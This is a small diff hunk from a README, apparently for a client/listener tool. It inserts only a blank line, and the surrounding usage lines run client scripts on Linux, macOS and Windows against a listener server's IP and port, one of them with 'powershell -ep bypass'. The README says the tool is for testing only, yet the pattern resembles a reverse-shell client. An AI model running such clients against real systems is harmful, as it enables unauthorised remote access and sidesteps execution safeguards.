@@ -21,6 +21,7 @@ This is only for testing purposes, not intended for anything illegal. I was test
     - Linux / MacOS
       - `python3 client.py -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
 OR
+
       - `bash client.sh -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
     - Windows
         - `powershell -ep bypass .\client.ps1 -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
